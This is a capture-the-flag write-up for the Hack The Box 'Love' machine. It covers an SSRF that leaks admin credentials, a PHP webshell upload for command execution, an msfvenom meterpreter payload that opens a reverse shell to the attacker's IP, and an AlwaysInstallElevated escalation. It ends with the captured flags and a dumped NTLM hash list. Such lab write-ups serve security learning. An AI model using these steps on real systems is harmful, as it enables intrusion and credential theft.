# LOVE.htb
<br>
IP: 10.10.10.239 <br>   Difficulty: Easy-Medium <br>

Added IP to hosts file and started rustscan.
Found many open ports, smb was on, many http servers were running.
Also in 5000 port output, I saw a subdomain named: staging.love.htb. So I added this subdomain into the hosts file.
I opened this new sub-domain and saw a file scanner.
It was accepting a URL input and it was scanning it.
I found out that we can scan any URL with it.

Since 5000 port was forbidden to us, so I thought if I can view the webpage at this port.
I entered:

```
http://localhost:5000
```
And I got valid admin credentials for the main webste.

```
admin: @LoveIsInTheAir!!!! 
```
## Command Execution

Logged into the web page as admin.
In the top right corner, I clicked on update profile and I can upload an image. I remembered the result of gobuster also had image directory.
If I could upload a php file or any other executable file, I can gain RCE.
I tried to upload a simple cmd.php.

```
cp /usr/share/webshells/php/simple-backdoor.php cmd.php
```

The file was uploaded and was visible in /images directory.
All I had to do to run command was:

```
http://love.htb/images/cmd.php?cmd=<command>
```

## Reverse shell and User.txt

Since I can run my commands, I had to generate a reverse shell in exe format. I used msfvenom for this.

```
msfvenom -p windows/meterpreter/reverse_tcp lport=4444 lhost=10.10.14.174 -f exe -o shell.exe
```

Now, I had reverse shell.exe and a command execution.
So I uploaded this shell.exe as image in update profile. I got uploaded succesfully.
Now all I had to do for a reverse shell was to start a metasploit listener and execute the shell.exe using RCE.

```
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp

Set options

http://love.htb/images/cmd.php?cmd=shell.exe
```

Got a reverse shell as Pheobe.
User.txt was in C:\Users\Phoebe\Desktop\User.txt

```
65d36c72a480d076e96f5df7cc99b8d6
```

## Root.txt

I used exploit/windows/local/always_install_elevated to escalate privilege to root.

Background the current session using Ctrl+Z and set exploit to exploit/windows/local/always_install_elevated.
Set options and run.

I got shell as AuthoritySystem.
Got root.txt in C:\Users\Administrator\Desktop\root.txt

```
a2c43e546e51e9c7ab1935cfed2ccd83
```
HashDump

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:aab42ca009fed69fa5ee57c52cf5bcf1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a76ad78f85923b7b58e79c8b818efa32:::
Phoebe:1002:aad3b435b51404eeaad3b435b51404ee:a9ccd3a011ceb45b44ce6f6b40122268:::
```
